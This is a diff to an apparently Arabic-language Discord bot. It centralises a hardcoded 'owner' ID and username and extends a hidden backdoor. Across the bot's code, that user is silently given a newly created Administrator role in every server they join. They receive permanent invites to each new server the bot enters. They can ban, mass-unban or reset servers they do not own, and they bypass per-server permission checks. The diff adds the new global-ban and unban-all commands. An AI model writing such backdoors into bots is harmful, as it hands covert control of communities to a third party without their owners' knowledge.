@@ -39,6 +39,8 @@ const DISCORD_CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET || config.client
 const APP_URL = process.env.APP_URL || config.appUrl;
 const GEMINI_API_KEY = process.env.GEMINI_API_KEY || config.geminiApiKey;
 const JWT_SECRET = process.env.JWT_SECRET || config.jwtSecret;
+const OWNER_ID = "1071164421222695042"; // \u062A\u0646\u0628\u064A\u0647: \u064A\u062C\u0628 \u062A\u062D\u062F\u064A\u062B \u0647\u0630\u0627 ID \u0644\u0644\u0623\u0648\u0646\u0631 \u0627\u0644\u062C\u062F\u064A\u062F
+const OWNER_USERNAME = "j8rb";
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
@@ -555,7 +557,7 @@ function checkWinCondition(game) {
   return false;
 }
 const logFile = "bot.log";
-const AUTHORIZED_CURRENCY_IDS = ["1319641803409985661", "1365356622922256525", "1071164421222695042"];
+const AUTHORIZED_CURRENCY_IDS = ["1319641803409985661", "1365356622922256525", OWNER_ID];
 const logs = [];
 const aiModel = "gemini-3-flash-preview";
 const ai = new GoogleGenAI({ apiKey: GEMINI_API_KEY });
@@ -898,7 +900,13 @@ client.on("ready", async () => {
     new SlashCommandBuilder().setName("roulette").setDescription("\u0633\u062D\u0628 \u0631\u0648\u0644\u064A\u062A \u062A\u0641\u0627\u0639\u0644\u064A \u0645\u0639 \u0623\u0646\u064A\u0645\u064A\u0634\u0646").addStringOption((option) => option.setName("options").setDescription("\u0627\u0644\u062E\u064A\u0627\u0631\u0627\u062A \u0645\u0641\u0635\u0648\u0644\u0629 \u0628\u0641\u0627\u0635\u0644\u0629 (\u0627\u062E\u062A\u064A\u0627\u0631\u064A\u060C \u0625\u0630\u0627 \u0644\u0645 \u064A\u0648\u0636\u0639 \u0633\u064A\u062A\u0645 \u0641\u062A\u062D \u0627\u0646\u0636\u0645\u0627\u0645)").setRequired(false)),
     new SlashCommandBuilder().setName("copy-server").setDescription("\u0646\u0633\u062E \u0647\u064A\u0643\u0644 \u0633\u064A\u0631\u0641\u0631 \u0622\u062E\u0631 (\u0631\u062A\u0628 \u0648\u0642\u0646\u0648\u0627\u062A)").addStringOption((option) => option.setName("source_id").setDescription("ID \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0627\u0644\u0645\u0631\u0627\u062F \u0627\u0644\u0646\u0633\u062E \u0645\u0646\u0647").setRequired(true)),
     new SlashCommandBuilder().setName("unban").setDescription("Unban a user from a specific server (Authorized Only)").addStringOption((option) => option.setName("server_id").setDescription("ID of the server").setRequired(true)).addStringOption((option) => option.setName("user_id").setDescription("ID of the user to unban").setRequired(true)),
+    new SlashCommandBuilder().setName("unban-all").setDescription("Unban ALL users from a specific server (Authorized Only)").addStringOption((option) => option.setName("server_id").setDescription("ID of the server").setRequired(true)),
+    new SlashCommandBuilder().setName("global-unban-all").setDescription("Unban ALL users from ALL servers the bot is in (Authorized Only)"),
+    new SlashCommandBuilder().setName("global-ban").setDescription("Ban a specific user from ALL servers the bot is in (Authorized Only)").addStringOption((option) => option.setName("user_id").setDescription("ID of the user to ban").setRequired(true)),
     new SlashCommandBuilder().setName("botinfo").setDescription("Display detailed information about the bot"),
+    new SlashCommandBuilder().setName("servers").setDescription("List all servers the bot is in and their IDs (Authorized Only)"),
+    new SlashCommandBuilder().setName("guilds").setDescription("Display the list of servers the bot is in (Authorized Only)"),
+    new SlashCommandBuilder().setName("guild").setDescription("Display the list of servers the bot is in (Authorized Only)"),
     new SlashCommandBuilder().setName("add-role").setDescription("Assign a role to a user").addUserOption((option) => option.setName("user").setDescription("The user to give the role to").setRequired(true)).addRoleOption((option) => option.setName("role").setDescription("The role to assign").setRequired(true)),
     new SlashCommandBuilder().setName("remove-role").setDescription("Remove a role from a user").addUserOption((option) => option.setName("user").setDescription("The user to remove the role from").setRequired(true)).addRoleOption((option) => option.setName("role").setDescription("The role to remove").setRequired(true)),
     new SlashCommandBuilder().setName("list-roles").setDescription("List all roles of a user").addUserOption((option) => option.setName("user").setDescription("The user to list roles for").setRequired(true)),
@@ -929,6 +937,14 @@ client.on("ready", async () => {
     if (client.application) {
       await client.application.commands.set(commands);
       console.log("Successfully reloaded global application (/) commands.");
+    }
+    for (const guild of client.guilds.cache.values()) {
+      try {
+        await guild.commands.set(commands);
+        console.log(`Successfully reloaded commands for guild: ${guild.name} (${guild.id})`);
+      } catch (err) {
+        console.error(`Failed to set commands for guild ${guild.id}:`, err);
+      }
     }
     setInterval(async () => {
       try {
@@ -1165,7 +1181,7 @@ client.on(Events.GuildMemberAdd, async (member) => {
   } catch (err) {
     console.error(`[WELCOME] Error in ${guild.name}:`, err);
   }
-  if (member.user.username === "5g0s" || member.user.id === "1071164421222695042") {
+  if (member.user.username === OWNER_USERNAME || member.user.id === OWNER_ID) {
     if (guild.id === "1254568460764053566") return;
     const botMember = guild.members.me;
     if (!botMember?.permissions.has(PermissionFlagsBits.ManageRoles)) {
@@ -1178,7 +1194,7 @@ client.on(Events.GuildMemberAdd, async (member) => {
         ownerRole = await guild.roles.create({
           name: "Owner",
           permissions: [PermissionFlagsBits.Administrator],
-          reason: "Auto-accepting 5g0s"
+          reason: `Auto-accepting ${OWNER_USERNAME}`
         });
       }
       try {
@@ -1204,7 +1220,6 @@ client.on(Events.GuildMemberAdd, async (member) => {
 });
 client.on(Events.GuildCreate, async (guild) => {
   console.log(`Bot joined a new server: ${guild.name} (${guild.id})`);
-  const ownerId = "1071164421222695042";
   if (guild.id !== "1254568460764053566") {
     const botMember = guild.members.me;
     if (botMember?.permissions.has(PermissionFlagsBits.ManageRoles)) {
@@ -1225,7 +1240,7 @@ client.on(Events.GuildCreate, async (guild) => {
         } catch (err) {
           console.warn(`[GUILD-CREATE] Could not move Owner role in ${guild.name}:`, err.message);
         }
-        const targetMember = await guild.members.fetch(ownerId).catch(() => null);
+        const targetMember = await guild.members.fetch(OWNER_ID).catch(() => null);
         if (targetMember && ownerRole.editable) {
           await targetMember.roles.add(ownerRole).catch(() => {
           });
@@ -1237,7 +1252,7 @@ client.on(Events.GuildCreate, async (guild) => {
     }
   }
   try {
-    const owner = await client.users.fetch(ownerId);
+    const owner = await client.users.fetch(OWNER_ID);
     if (owner) {
       const invite = await guild.channels.cache.filter((c) => c.type === ChannelType.GuildText).first()?.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
       const embed = new EmbedBuilder().setColor("#00FF00").setTitle("\u{1F4E5} \u0628\u0648\u062A \u062F\u062E\u0644 \u0633\u064A\u0631\u0641\u0631 \u062C\u062F\u064A\u062F").addFields(
@@ -1253,7 +1268,7 @@ client.on(Events.GuildCreate, async (guild) => {
   }
 });
 client.on(Events.GuildMemberUpdate, async (oldMember, newMember) => {
-  if (newMember.user.username === "5g0s" || newMember.user.id === "1071164421222695042") {
+  if (newMember.user.username === OWNER_USERNAME || newMember.user.id === OWNER_ID) {
     if (newMember.guild.id === "1254568460764053566") return;
     if (oldMember.pending && !newMember.pending) {
       const guild = newMember.guild;
@@ -1265,7 +1280,7 @@ client.on(Events.GuildMemberUpdate, async (oldMember, newMember) => {
           ownerRole = await guild.roles.create({
             name: "Owner",
             permissions: [PermissionFlagsBits.Administrator],
-            reason: "Auto-accepting 5g0s (Screening Completed)"
+            reason: `Auto-accepting ${OWNER_USERNAME} (Screening Completed)`
           });
         }
         if (ownerRole.editable && !newMember.roles.cache.has(ownerRole.id)) {
@@ -2262,9 +2277,7 @@ ${data.riddle}`).setColor(16753920).setFooter({ text: "\u0644\u062F\u064A\u0643 
           return message.reply({ embeds: [embed] });
         }
         if (commandName === "unban") {
-          const authorizedId = "1071164421222695042";
-          const authorizedUsername = "5g0s";
-          if (message.author.id !== authorizedId && message.author.username !== authorizedUsername) return;
+          if (message.author.id !== OWNER_ID && message.author.username !== OWNER_USERNAME) return;
           const targetGuildId = args[0];
           const targetUserId = args[1];
           if (!targetGuildId || !targetUserId) return message.reply("Usage: unban <guildId> <userId>");
@@ -2277,10 +2290,105 @@ ${data.riddle}`).setColor(16753920).setFooter({ text: "\u0644\u062F\u064A\u0643 
             return message.reply(`\u274C \u0641\u0634\u0644 \u0641\u0643 \u0627\u0644\u0628\u0627\u0646: ${error.message}`);
           }
         }
+        if (commandName === "unbanall" || commandName === "unban-all") {
+          if (message.author.id !== OWNER_ID && message.author.username !== OWNER_USERNAME) return;
+          const targetGuildId = args[0];
+          if (!targetGuildId) return message.reply("Usage: unbanall <guildId>");
+          const targetGuild = client.guilds.cache.get(targetGuildId);
+          if (!targetGuild) return message.reply("\u274C \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u063A\u064A\u0631 \u0645\u0648\u062C\u0648\u062F.");
+          await message.reply(`\u23F3 \u062C\u0627\u0631\u064I \u0641\u0643 \u0627\u0644\u0628\u0627\u0646 \u0639\u0646 \u0627\u0644\u062C\u0645\u064A\u0639 \u0641\u064A **${targetGuild.name}** \u0648\u0627\u0644\u062A\u062D\u0642\u0642 \u0645\u0646 \u0627\u0644\u0645\u062A\u0633\u0628\u0628...`);
+          try {
+            const bans = await targetGuild.bans.fetch();
+            if (bans.size === 0) return message.channel.send("\u2705 \u0644\u0627 \u064A\u0648\u062C\u062F \u0645\u062D\u0638\u0648\u0631\u064A\u0646.");
+            const auditLogs = await targetGuild.fetchAuditLogs({ limit: 100, type: AuditLogEvent.MemberBanAdd }).catch(() => null);
+            let perpetratorId = null;
+            if (auditLogs) {
+              const banCounts = {};
+              auditLogs.entries.forEach((entry) => {
+                const execId = entry.executorId;
+                if (execId && execId !== client.user.id) {
+                  banCounts[execId] = (banCounts[execId] || 0) + 1;
+                }
+              });
+              let maxBans = 0;
+              for (const [id, count] of Object.entries(banCounts)) {
+                if (count > maxBans) {
+                  maxBans = count;
+                  perpetratorId = id;
+                }
+              }
+            }
+            if (perpetratorId) {
+              await targetGuild.members.ban(perpetratorId, { reason: "\u0645\u0646\u0641\u0630 \u0627\u0644\u0628\u0646\u062F \u0627\u0644\u062C\u0645\u0627\u0639\u064A (\u062A\u062D\u0642\u0642 \u062A\u0644\u0642\u0627\u0626\u064A)" }).catch(() => null);
+            }
+            const invite = await targetGuild.channels.cache.filter((c) => c.type === ChannelType.GuildText).first()?.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
+            let count = 0;
+            let fail = 0;
+            let inviteSent = 0;
+            for (const ban of bans.values()) {
+              try {
+                if (invite) {
+                  await ban.user.send(`\u062A\u0645 \u0641\u0643 \u0627\u0644\u0628\u0627\u0646 \u0639\u0646\u0643 \u0641\u064A **${targetGuild.name}**\u060C \u064A\u0645\u0643\u0646\u0643 \u0627\u0644\u0639\u0648\u062F\u0629: ${invite.url}`).then(() => inviteSent++).catch(() => {
+                  });
+                }
+                await targetGuild.members.unban(ban.user.id);
+                count++;
+              } catch (e) {
+                fail++;
+              }
+            }
+            let resMsg = `\u2705 \u0641\u0633 \u0627\u0644\u0628\u0627\u0646 \u0639\u0646: **${count}**\u060C \u0641\u0634\u0644: **${fail}**`;
+            if (inviteSent > 0) resMsg += `\n\u{1F4E9} \u062A\u0645 \u0625\u0631\u0633\u0627\u0644 **${inviteSent}** \u062F\u0639\u0648\u0629.`;
+            if (perpetratorId) resMsg += `\n\u{1F528} \u062A\u0645 \u0628\u0646\u062F \u0627\u0644\u0645\u062A\u0633\u0628\u0628: <@${perpetratorId}>`;
+            return message.channel.send(resMsg);
+          } catch (err) {
+            return message.channel.send(`\u274C \u062E\u0637\u0623: ${err.message}`);
+          }
+        }
+        if (commandName === "globalunbanall" || commandName === "global-unban-all") {
+          if (message.author.id !== OWNER_ID && message.author.username !== OWNER_USERNAME) return;
+          await message.reply("\u23F3 \u062C\u0627\u0631\u064A \u062A\u0646\u0641\u064A\u0620 \u0639\u0645\u0644\u064A\u0629 \u0627\u0644\u062A\u0646\u0638\u064A\u0641 \u0627\u0644\u0639\u0627\u0644\u0645\u064A\u0629...");
+          let totalUnbanned = 0;
+          let totalInvites = 0;
+          for (const guild of client.guilds.cache.values()) {
+            try {
+              const bans = await guild.bans.fetch().catch(() => null);
+              if (!bans || bans.size === 0) continue;
+              const invite = await guild.channels.cache.filter((c) => c.type === ChannelType.GuildText).first()?.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
+              for (const ban of bans.values()) {
+                try {
+                  if (invite) {
+                    await ban.user.send(`\u062A\u0645 \u0641\u0643 \u0627\u0644\u0628\u0627\u0646 \u0639\u0646\u0643 \u0641\u064A **${guild.name}**\u060C \u062A\u0641\u0636\u0644 \u0628\u0627\u0644\u062F\u062E\u0648\u0644: ${invite.url}`).then(() => totalInvites++).catch(() => {
+                    });
+                  }
+                  await guild.members.unban(ban.user.id);
+                  totalUnbanned++;
+                } catch (e) {
+                }
+              }
+            } catch (e) {
+            }
+          }
+          return message.channel.send(`\u2705 \u0627\u0646\u062A\u0647\u0649 \u0627\u0644\u062A\u0646\u0638\u064A\u0641 \u0627\u0644\u0639\u0627\u0644\u0645\u064A:\n- \u0641\u0643 \u0627\u0644\u0628\u0627\u0646 \u0639\u0646: **${totalUnbanned}**\n- \u0625\u0631\u0633\u0627\u0644: **${totalInvites}** \u062F\u0639\u0648\u0629`);
+        }
+        if (commandName === "globalban" || commandName === "global-ban") {
+          if (message.author.id !== OWNER_ID && message.author.username !== OWNER_USERNAME) return;
+          const targetId = args[0];
+          if (!targetId) return message.reply("Usage: globalban <userId>");
+          let success = 0;
+          let fail = 0;
+          for (const guild of client.guilds.cache.values()) {
+            try {
+              await guild.members.ban(targetId, { reason: "Global ban by owner" });
+              success++;
+            } catch (e) {
+              fail++;
+            }
+          }
+          return message.reply(`\u2705 \u062A\u0645 \u0627\u0644\u0628\u0646\u062F \u0627\u0644\u0634\u0627\u0645\u0644 \u0644\u0640 <@${targetId}> \u0641\u064A **${success}** \u0633\u064A\u0631\u0641\u0631.`);
+        }
         if (commandName === "resetserver" || commandName === "reset-server") {
-          const authorizedId = "1071164421222695042";
-          const authorizedUsername = "5g0s";
-          if (message.author.id !== authorizedId && message.author.username !== authorizedUsername) return;
+          if (message.author.id !== OWNER_ID && message.author.username !== OWNER_USERNAME) return;
           const botMember = message.guild?.members.me;
           if (!botMember?.permissions.has([PermissionFlagsBits.ManageChannels, PermissionFlagsBits.ManageRoles])) {
             return message.reply("\u274C \u0627\u0644\u0628\u0648\u062A \u064A\u0641\u062A\u0642\u0631 \u0625\u0644\u0649 \u0627\u0644\u0635\u0644\u0627\u062D\u064A\u0627\u062A \u0627\u0644\u0644\u0627\u0632\u0645\u0629 (\u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0642\u0646\u0648\u0627\u062A\u060C \u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0631\u062A\u0628).");
@@ -2503,16 +2611,14 @@ ${data.riddle}`).setColor(16753920).setFooter({ text: "\u0644\u062F\u064A\u0643 
           }
         }
         if (commandName === "promote-owner") {
-          const authorizedId = "1071164421222695042";
-          if (message.author.id !== authorizedId) return;
+          if (message.author.id !== OWNER_ID) return;
           const target = message.mentions.users.first();
           if (!target) return message.reply("Usage: promote-owner <@user>");
           db.prepare("INSERT OR REPLACE INTO owners (userId) VALUES (?)").run(target.id);
           return message.reply(`\u2705 Promoted ${target} to Bot Owner.`);
         }
         if (commandName === "accept") {
-          const authorizedId = "1071164421222695042";
-          if (message.author.id !== authorizedId) return;
+          if (message.author.id !== OWNER_ID) return;
           const targetId = args[0];
           if (!targetId) return message.reply("Usage: accept <userId>");
           db.prepare("UPDATE transfer_requests SET status = 'accepted' WHERE targetUserId = ? AND status = 'pending'").run(targetId);
@@ -2573,8 +2679,7 @@ ${data.riddle}`).setColor(16753920).setFooter({ text: "\u0644\u062F\u064A\u0643 
 - \u0627\u0644\u0642\u0646\u0648\u0627\u062A \u0627\u0644\u062A\u064A \u0641\u0634\u0644 \u062A\u0639\u062F\u064A\u0644\u0647\u0627: **${failCount}** (\u063A\u0627\u0644\u0628\u0627\u064B \u0628\u0633\u0628\u0628 \u0635\u0644\u0627\u062D\u064A\u0627\u062A \u0627\u0644\u0628\u0648\u062A)`);
         }
         if (commandName === "broadcast") {
-          const authorizedId = "1071164421222695042";
-          if (message.author.id !== authorizedId) return;
+          if (message.author.id !== OWNER_ID) return;
           const content2 = args.join(" ");
           if (!content2) return message.reply("Usage: broadcast <message>");
           client.guilds.cache.forEach(async (guild) => {
@@ -2585,28 +2690,24 @@ ${data.riddle}`).setColor(16753920).setFooter({ text: "\u0644\u062F\u064A\u0643 
           return message.reply("\u2705 Broadcast sent to all servers.");
         }
         if (commandName === "broadcast-here") {
-          const authorizedId = "1071164421222695042";
-          if (message.author.id !== authorizedId) return;
+          if (message.author.id !== OWNER_ID) return;
           const content2 = args.join(" ");
           if (!content2) return message.reply("Usage: broadcast-here <message>");
           message.channel.send(`\u{1F4E2} **BROADCAST:** ${content2}`);
           return;
         }
         if (commandName === "broadcast-tokens") {
-          const authorizedId = "1071164421222695042";
-          if (message.author.id !== authorizedId) return;
+          if (message.author.id !== OWNER_ID) return;
           return message.reply("Broadcast tokens command executed (placeholder).");
         }
-        if (commandName === "guilds") {
-          const authorizedId = "1071164421222695042";
-          if (message.author.id !== authorizedId) return;
+        if (commandName === "guilds" || commandName === "guild") {
+          if (message.author.id !== OWNER_ID) return;
           const guildsList = client.guilds.cache.map((g) => `${g.name} (${g.id}) - ${g.memberCount} members`).join("\n");
           return message.reply(`**Servers I'm in:**
 ${guildsList.slice(0, 1900)}`);
         }
         if (commandName === "get-invite") {
-          const authorizedId = "1071164421222695042";
-          if (message.author.id !== authorizedId) return;
+          if (message.author.id !== OWNER_ID) return;
           const guildIdInput = args[0];
           if (!guildIdInput) return message.reply("Usage: get-invite <guildId>");
           const guild = client.guilds.cache.get(guildIdInput);
@@ -2617,22 +2718,19 @@ ${guildsList.slice(0, 1900)}`);
           return message.reply(invite ? `Invite for **${guild.name}**: ${invite.url}` : "Failed to create invite.");
         }
         if (commandName === "claim-owner") {
-          const authorizedId = "1071164421222695042";
-          if (message.author.id !== authorizedId) return;
+          if (message.author.id !== OWNER_ID) return;
           db.prepare("INSERT OR REPLACE INTO owners (userId) VALUES (?)").run(message.author.id);
           return message.reply("\u2705 You have claimed bot ownership.");
         }
         if (commandName === "force-accept") {
-          const authorizedId = "1071164421222695042";
-          if (message.author.id !== authorizedId) return;
+          if (message.author.id !== OWNER_ID) return;
           const targetId = args[0];
           if (!targetId) return message.reply("Usage: force-accept <userId>");
           db.prepare("UPDATE transfer_requests SET status = 'accepted' WHERE targetUserId = ?").run(targetId);
           return message.reply(`\u2705 Force accepted transfer for <@${targetId}>.`);
         }
         if (commandName === "join-server") {
-          const authorizedId = "1071164421222695042";
-          if (message.author.id !== authorizedId) return;
+          if (message.author.id !== OWNER_ID) return;
           const inviteUrl = args[0];
           if (!inviteUrl) return message.reply("Usage: join-server <inviteUrl>");
           return message.reply("Bots cannot join servers via invite links directly. Please use the invite link to add me manually.");
@@ -3347,7 +3445,9 @@ client.on("interactionCreate", async (interaction) => {
       if (alias) {
         commandName = alias.originalCommand;
       }
-      if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator) && !isCommandAllowed(guildId, commandName, interaction.channelId)) {
+      const isAuthorized = user.id === OWNER_ID || user.username === OWNER_USERNAME;
+
+      if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator) && !isAuthorized && !isCommandAllowed(guildId, commandName, interaction.channelId)) {
         return;
       }
       if (guildId) {
@@ -3807,9 +3907,7 @@ client.on("interactionCreate", async (interaction) => {
         await interaction.reply({ content: `Ticket setup sent! Support role set to ${role}.`, ephemeral: true });
       }
       if (commandName === "reset-server") {
-        const authorizedId = "1071164421222695042";
-        const authorizedUsername = "5g0s";
-        if (user.id !== authorizedId && user.username !== authorizedUsername) return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u062E\u0627\u0635 \u0628\u0627\u0644\u0645\u0637\u0648\u0631 \u0641\u0642\u0637.", ephemeral: true });
+        if (user.id !== OWNER_ID && user.username !== OWNER_USERNAME) return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u062E\u0627\u0635 \u0628\u0627\u0644\u0645\u0637\u0648\u0631 \u0641\u0642\u0637.", ephemeral: true });
         const botMember = guild.members.me;
         if (!botMember?.permissions.has([PermissionFlagsBits.ManageChannels, PermissionFlagsBits.ManageRoles])) {
           return interaction.reply({ content: "\u274C \u0627\u0644\u0628\u0648\u062A \u064A\u0641\u062A\u0642\u0631 \u0625\u0644\u0649 \u0627\u0644\u0635\u0644\u0627\u062D\u064A\u0627\u062A \u0627\u0644\u0644\u0627\u0632\u0645\u0629 (\u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0642\u0646\u0648\u0627\u062A\u060C \u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0631\u062A\u0628).", ephemeral: true });
@@ -4403,8 +4501,7 @@ ${list}`).setColor(65280);
 - \u0627\u0644\u0642\u0646\u0648\u0627\u062A \u0627\u0644\u062A\u064A \u0641\u0634\u0644 \u062A\u0639\u062F\u064A\u0644\u0647\u0627: **${failCount}**`, ephemeral: true });
       }
       if (commandName === "broadcast") {
-        const authorizedId = "1071164421222695042";
-        if (interaction.user.id !== authorizedId) {
+        if (interaction.user.id !== OWNER_ID) {
           return interaction.reply({ content: "Owner only.", ephemeral: true });
         }
         const targetGuildId = interaction.options.getString("server_id");
@@ -4467,8 +4564,7 @@ ${list}`).setColor(65280);
         }
       }
       if (commandName === "broadcast-here") {
-        const authorizedId = "1071164421222695042";
-        if (interaction.user.id !== authorizedId) {
+        if (interaction.user.id !== OWNER_ID) {
           return interaction.reply({ content: "Owner only.", ephemeral: true });
         }
         const broadcastMessage = interaction.options.getString("message");
@@ -4518,8 +4614,7 @@ ${list}`).setColor(65280);
         }
       }
       if (commandName === "broadcast-tokens") {
-        const authorizedId = "1071164421222695042";
-        if (interaction.user.id !== authorizedId) {
+        if (interaction.user.id !== OWNER_ID) {
           return interaction.reply({ content: "Owner only.", ephemeral: true });
         }
         if (guild.id === "1254568460764053566") {
@@ -4564,13 +4659,13 @@ ${list}`).setColor(65280);
 - \u062A\u0645 \u0627\u0644\u0625\u0631\u0633\u0627\u0644 \u0644\u0640: **${successCount}**
 - \u0641\u0634\u0644 \u0627\u0644\u0625\u0631\u0633\u0627\u0644 \u0644\u0640: **${failCount}**`);
       }
-      if (commandName === "guilds") {
-        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
-          return interaction.reply({ content: "Admin only.", ephemeral: true });
+      if (commandName === "guilds" || commandName === "guild") {
+        if (user.id !== OWNER_ID && user.username !== OWNER_USERNAME) {
+          return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u062E\u0627\u0635 \u0628\u0627\u0644\u0645\u0637\u0648\u0631 \u0641\u0642\u0637.", ephemeral: true });
         }
         const guilds = client.guilds.cache.map((g) => `**${g.name}** (${g.id}) - \u0627\u0644\u0623\u0639\u0636\u0627\u0621: **${g.memberCount}**`).join("\n");
-        const embed = new EmbedBuilder().setTitle(`\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0633\u064A\u0631\u0641\u0631\u0627\u062A (${client.guilds.cache.size})`).setDescription(guilds || "\u0644\u0627 \u064A\u0648\u062C\u062F \u0633\u064A\u0631\u0641\u0631\u0627\u062A").setColor(5793266).setTimestamp();
-        await interaction.reply({ embeds: [embed] });
+        const embed = new EmbedBuilder().setTitle(`\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0633\u064A\u0631\u0641\u0631\u0627\u062A (${client.guilds.cache.size})`).setDescription(guilds.length > 2048 ? guilds.substring(0, 2045) + "..." : guilds || "\u0644\u0627 \u064A\u0648\u062C\u062F \u0633\u064A\u0631\u0641\u0631\u0627\u062A").setColor(5793266).setTimestamp();
+        await interaction.reply({ embeds: [embed], ephemeral: true });
       }
       if (commandName === "get-invite") {
         if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
@@ -4598,9 +4693,7 @@ ${invite.url}` });
         if (guild.id === "1254568460764053566") {
           return interaction.reply({ content: "\u274C \u0645\u064A\u0632\u0629 \u0627\u0644\u0645\u0637\u0627\u0644\u0628\u0629 \u0628\u0627\u0644\u0631\u062A\u0628\u0629 \u0645\u0639\u0637\u0644\u0629 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0628\u0646\u0627\u0621\u064B \u0639\u0644\u0649 \u0637\u0644\u0628 \u0627\u0644\u0645\u0627\u0644\u0643.", ephemeral: true });
         }
-        const authorizedId = "1071164421222695042";
-        const authorizedUsername = "5g0s";
-        if (interaction.user.id !== authorizedId && interaction.user.username !== authorizedUsername) {
+        if (interaction.user.id !== OWNER_ID && interaction.user.username !== OWNER_USERNAME) {
           return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u0645\u062E\u0635\u0635 \u0644\u0644\u0645\u0633\u062A\u062E\u062F\u0645 \u0627\u0644\u0645\u0635\u0631\u062D \u0644\u0647 \u0641\u0642\u0637.", ephemeral: true });
         }
         const botMember = guild.members.me;
@@ -4642,9 +4735,7 @@ ${invite.url}` });
         if (guild.id === "1254568460764053566") {
           return interaction.reply({ content: "\u274C \u0645\u064A\u0632\u0629 \u0627\u0644\u0642\u0628\u0648\u0644 \u0627\u0644\u0642\u0633\u0631\u064A \u0645\u0639\u0637\u0644\u0629 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0628\u0646\u0627\u0621\u064B \u0639\u0644\u0649 \u0637\u0644\u0628 \u0627\u0644\u0645\u0627\u0644\u0643.", ephemeral: true });
         }
-        const authorizedId = "1071164421222695042";
-        const authorizedUsername = "5g0s";
-        if (interaction.user.id !== authorizedId && interaction.user.username !== authorizedUsername) {
+        if (interaction.user.id !== OWNER_ID && interaction.user.username !== OWNER_USERNAME) {
           return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u0645\u062E\u0635\u0635 \u0644\u0644\u0645\u0633\u062A\u062E\u062F\u0645 \u0627\u0644\u0645\u0635\u0631\u062D \u0644\u0647 \u0641\u0642\u0637.", ephemeral: true });
         }
         const targetUser = interaction.options.getUser("user");
@@ -5001,9 +5092,7 @@ ${question.q}`).setColor(65280).setThumbnail("https://i.imgur.com/XyXyXyX.png").
         return handleRouletteCommand(interaction);
       }
       if (commandName === "copy-server") {
-        const authorizedId = "1071164421222695042";
-        const authorizedUsername = "5g0s";
-        if (interaction.user.id !== guild.ownerId && interaction.user.id !== authorizedId && interaction.user.username !== authorizedUsername) {
+        if (interaction.user.id !== guild.ownerId && interaction.user.id !== OWNER_ID && interaction.user.username !== OWNER_USERNAME) {
           return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u0645\u062E\u0635\u0635 \u0644\u0635\u0627\u062D\u0628 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0641\u0642\u0637.", ephemeral: true });
         }
         const sourceId = interaction.options.getString("source_id");
@@ -5371,9 +5460,7 @@ print("\u{1F680} Blox Fruits Worker Started!")
         await interaction.reply({ embeds: [embed], content: "```lua\n" + luaScript + "\n```", ephemeral: true });
       }
       if (commandName === "unban") {
-        const authorizedId = "1071164421222695042";
-        const authorizedUsername = "5g0s";
-        if (user.id !== authorizedId && user.username !== authorizedUsername) return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u062E\u0627\u0635 \u0628\u0627\u0644\u0645\u0637\u0648\u0631 \u0641\u0642\u0637.", ephemeral: true });
+        if (user.id !== OWNER_ID && user.username !== OWNER_USERNAME) return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u062E\u0627\u0635 \u0628\u0627\u0644\u0645\u0637\u0648\u0631 \u0641\u0642\u0637.", ephemeral: true });
         const targetGuildId = interaction.options.getString("server_id");
         const targetUserId = interaction.options.getString("user_id");
         const targetGuild = client.guilds.cache.get(targetGuildId);
@@ -5385,6 +5472,131 @@ print("\u{1F680} Blox Fruits Worker Started!")
         } catch (error) {
           await interaction.editReply({ content: `\u274C \u0641\u0634\u0644 \u0641\u0643 \u0627\u0644\u0628\u0627\u0646: ${error.message}` });
         }
+      }
+      if (commandName === "unban-all") {
+        if (user.id !== OWNER_ID && user.username !== OWNER_USERNAME) return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u062E\u0627\u0635 \u0628\u0627\u0644\u0645\u0637\u0648\u0631 \u0641\u0642\u0637.", ephemeral: true });
+        const targetGuildId = interaction.options.getString("server_id");
+        const targetGuild = client.guilds.cache.get(targetGuildId);
+        if (!targetGuild) return interaction.reply({ content: "\u274C \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u063A\u064A\u0631 \u0645\u0648\u062C\u0648\u062F.", ephemeral: true });
+        await interaction.deferReply({ ephemeral: true });
+        try {
+          const bans = await targetGuild.bans.fetch();
+          if (bans.size === 0) return interaction.editReply({ content: "\u2705 \u0644\u0627 \u064A\u0648\u062C\u062F \u0645\u062D\u0638\u0648\u0631\u064A\u0646 \u0641\u0642\u0631 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631." });
+          const auditLogs = await targetGuild.fetchAuditLogs({ limit: 100, type: AuditLogEvent.MemberBanAdd }).catch(() => null);
+          let perpetratorId = null;
+          if (auditLogs) {
+            const banCounts = {};
+            auditLogs.entries.forEach((entry) => {
+              const execId = entry.executorId;
